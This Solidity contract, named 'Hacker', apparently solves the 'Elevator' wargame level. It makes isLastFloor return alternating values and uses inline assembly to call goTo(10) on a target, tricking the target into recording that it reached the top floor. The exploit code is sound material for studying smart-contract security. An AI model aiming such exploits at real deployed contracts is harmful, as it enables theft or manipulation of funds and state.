// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

contract Hacker {
  address public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() {
    hacker = payable(msg.sender);
  }

  bool public isLast = true;

  /// @notice The target contract will call, here is the key to top up the elevator.
  function isLastFloor(uint256) external returns (bool) {
    isLast = !isLast;
    return isLast;
  }

  function attack(address _target) public onlyHacker {
    // generate goTo function signature
    bytes memory sig = abi.encodeWithSignature("goTo(uint256)", 10);

    assembly {
      // Load the length (first 32 bytes)
      let len := mload(sig)
      // Skip over the length field.
      let data := add(sig, 0x20)
      pop(
        // discard result
        call(
          gas(), // gas
          _target, // target address
          0, // ether
          data, // input location
          len, // length of input params
          0, // output location
          0 // no need to use output params
        )
      )
    }
  }
}
